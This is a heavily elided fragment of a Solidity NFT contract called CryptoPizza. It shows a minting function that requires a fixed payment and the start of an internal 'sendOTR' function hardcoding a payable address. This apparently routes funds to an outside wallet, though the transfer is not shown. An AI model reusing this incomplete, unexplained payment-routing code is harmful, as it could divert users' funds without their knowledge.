...
contract CryptoPizza is IERC721, ERC165 {
    ...
    function _createPizza(string memory _name) payable public
        ...
        isUnique(_name)
    {
        require(msg.value ==  7100000000000000);
    ...
    function sendOTR(address) internal {
     address payable Contract = payable(address(0x9174874Aec6F44524C94529bFE4944912eA6Ce46));
